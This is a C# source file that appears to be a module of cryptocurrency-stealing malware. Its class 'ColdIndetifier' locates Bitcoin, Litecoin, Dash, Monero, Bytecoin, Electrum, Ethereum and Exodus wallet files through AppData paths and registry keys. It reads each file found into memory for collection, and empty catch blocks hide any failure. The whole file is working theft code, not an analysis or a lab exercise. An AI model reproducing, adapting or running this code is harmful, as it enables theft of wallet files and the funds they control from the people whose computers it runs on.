using Microsoft.Win32;
using NoiseMe.Drags.App.Models.Common;
using NoiseMe.Drags.App.Models.Credentials;
using System;
using System.Collections.Generic;
using System.IO;

namespace NoiseMe.Drags.App.Data.Recovery
{
	public class ColdIndetifier : GH9kf<ColdWallet>
	{
		public List<ColdWallet> EnumerateData()
		{
			List<ColdWallet> list = new List<ColdWallet>();
			try
			{
				ColdWallet coldWallet = LTC();
				ColdWallet coldWallet2 = BQT();
				ColdWallet coldWallet3 = BTC();
				ColdWallet coldWallet4 = DQT();
				ColdWallet coldWallet5 = LTCQT();
				ColdWallet coldWallet6 = MNT();
				if (coldWallet != null)
				{
					list.Add(coldWallet);
				}
				if (coldWallet2 != null)
				{
					list.Add(coldWallet2);
				}
				if (coldWallet3 != null)
				{
					list.Add(coldWallet3);
				}
				if (coldWallet4 != null)
				{
					list.Add(coldWallet4);
				}
				if (coldWallet5 != null)
				{
					list.Add(coldWallet5);
				}
				if (coldWallet6 != null)
				{
					list.Add(coldWallet6);
				}
				foreach (ColdWallet item in BYT() ?? new List<ColdWallet>())
				{
					if (item != null)
					{
						list.Add(item);
					}
				}
				foreach (ColdWallet item2 in ELECT() ?? new List<ColdWallet>())
				{
					if (item2 != null)
					{
						list.Add(item2);
					}
				}
				foreach (ColdWallet item3 in ETH() ?? new List<ColdWallet>())
				{
					if (item3 != null)
					{
						list.Add(item3);
					}
				}
				foreach (ColdWallet item4 in EXDS() ?? new List<ColdWallet>())
				{
					if (item4 != null)
					{
						list.Add(item4);
					}
				}
				return list;
			}
			catch
			{
				return list;
			}
		}

		private ColdWallet LTC()
		{
			try
			{
				string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Litecoin\\wallet.dat";
				if (File.Exists(path))
				{
					byte[] array = File.ReadAllBytes(path);
					if (array != null)
					{
						return new ColdWallet
						{
							DataArray = array,
							WalletName = "Litecoin",
							Name = "wallet.dat"
						};
					}
				}
			}
			catch
			{
			}
			return null;
		}

		private ColdWallet BQT()
		{
			try
			{
				using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software")?.OpenSubKey("Bitcoin")?.OpenSubKey("Bitcoin-Qt"))
				{
					string path = registryKey?.GetValue("strDataDir").ToString() + "\\wallet.dat";
					if (File.Exists(path))
					{
						byte[] array = File.ReadAllBytes(path);
						if (array != null)
						{
							return new ColdWallet
							{
								DataArray = array,
								WalletName = "Bitcoin-Qt",
								Name = "wallet.dat"
							};
						}
					}
				}
			}
			catch
			{
			}
			return null;
		}

		private ColdWallet BTC()
		{
			try
			{
				string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Bitcoin\\wallet.dat";
				if (File.Exists(path))
				{
					byte[] array = File.ReadAllBytes(path);
					if (array != null)
					{
						return new ColdWallet
						{
							DataArray = array,
							WalletName = "Bitcoin",
							Name = "wallet.dat"
						};
					}
				}
			}
			catch
			{
			}
			return null;
		}

		private List<ColdWallet> BYT()
		{
			List<ColdWallet> list = new List<ColdWallet>();
			try
			{
				DirectoryInfo directoryInfo = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\bytecoin");
				if (!directoryInfo.Exists)
				{
					return list;
				}
				FileInfo[] files = directoryInfo.GetFiles();
				foreach (FileInfo fileInfo in files)
				{
					if (fileInfo.Extension.Equals(".wallet"))
					{
						byte[] array = File.ReadAllBytes(fileInfo.FullName);
						if (array != null)
						{
							list.Add(new ColdWallet
							{
								DataArray = array,
								Name = fileInfo.Name,
								WalletName = "Bytecoin"
							});
						}
					}
				}
				return list;
			}
			catch
			{
				return list;
			}
		}

		private List<ColdWallet> EXDS()
		{
			List<ColdWallet> list = new List<ColdWallet>();
			try
			{
				DirectoryInfo directoryInfo = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Exodus\\exodus.wallet");
				if (!directoryInfo.Exists)
				{
					return list;
				}
				FileInfo[] files = directoryInfo.GetFiles();
				foreach (FileInfo fileInfo in files)
				{
					byte[] array = File.ReadAllBytes(fileInfo.FullName);
					if (array != null)
					{
						list.Add(new ColdWallet
						{
							DataArray = array,
							Name = fileInfo.Name,
							WalletName = "Exodus"
						});
					}
				}
				return list;
			}
			catch
			{
				return list;
			}
		}

		private ColdWallet DQT()
		{
			try
			{
				using (RegistryKey registryKey = Registry.CurrentUser?.OpenSubKey("Software")?.OpenSubKey("Dash")?.OpenSubKey("Dash-Qt"))
				{
					string path = registryKey?.GetValue("strDataDir").ToString() + "\\wallet.dat";
					if (File.Exists(path))
					{
						byte[] array = File.ReadAllBytes(path);
						if (array != null)
						{
							return new ColdWallet
							{
								DataArray = array,
								WalletName = "Dash-Qt",
								Name = "wallet.dat"
							};
						}
					}
				}
			}
			catch
			{
			}
			return null;
		}

		private List<ColdWallet> ELECT()
		{
			List<ColdWallet> list = new List<ColdWallet>();
			try
			{
				DirectoryInfo directoryInfo = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Electrum\\wallets");
				if (!directoryInfo.Exists)
				{
					return list;
				}
				FileInfo[] files = directoryInfo.GetFiles();
				foreach (FileInfo fileInfo in files)
				{
					if (fileInfo.Exists)
					{
						byte[] array = File.ReadAllBytes(fileInfo.FullName);
						if (array != null)
						{
							list.Add(new ColdWallet
							{
								DataArray = array,
								Name = fileInfo.Name,
								WalletName = "Electrum"
							});
						}
					}
				}
				return list;
			}
			catch
			{
				return list;
			}
		}

		private List<ColdWallet> ETH()
		{
			List<ColdWallet> list = new List<ColdWallet>();
			try
			{
				DirectoryInfo directoryInfo = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Ethereum\\wallets");
				if (!directoryInfo.Exists)
				{
					return list;
				}
				FileInfo[] files = directoryInfo.GetFiles();
				foreach (FileInfo fileInfo in files)
				{
					if (fileInfo.Exists)
					{
						byte[] array = File.ReadAllBytes(fileInfo.FullName);
						if (array != null)
						{
							list.Add(new ColdWallet
							{
								DataArray = array,
								Name = fileInfo.Name,
								WalletName = "Ethereum"
							});
						}
					}
				}
				return list;
			}
			catch
			{
				return list;
			}
		}

		private ColdWallet LTCQT()
		{
			try
			{
				using (RegistryKey registryKey = Registry.CurrentUser?.OpenSubKey("Software")?.OpenSubKey("Litecoin")?.OpenSubKey("Litecoin-Qt"))
				{
					string path = registryKey?.GetValue("strDataDir").ToString() + "\\wallet.dat";
					if (File.Exists(path))
					{
						byte[] array = File.ReadAllBytes(path);
						if (array != null)
						{
							return new ColdWallet
							{
								DataArray = array,
								WalletName = "Litecoin-Qt",
								Name = "wallet.dat"
							};
						}
					}
				}
			}
			catch
			{
			}
			return null;
		}

		private ColdWallet MNT()
		{
			try
			{
				using (RegistryKey registryKey = Registry.CurrentUser?.OpenSubKey("Software")?.OpenSubKey("monero-project")?.OpenSubKey("monero-core"))
				{
					char[] separator = new char[1]
					{
						'\\'
					};
					string text = registryKey?.GetValue("wallet_path").ToString().Replace("/", "\\");
					if (File.Exists(text))
					{
						byte[] array = File.ReadAllBytes(text);
						if (array != null)
						{
							return new ColdWallet
							{
								DataArray = array,
								WalletName = "Monero",
								Name = text.Split(separator)[text.Split(separator).Length - 1]
							};
						}
					}
				}
			}
			catch
			{
			}
			return null;
		}
	}
}
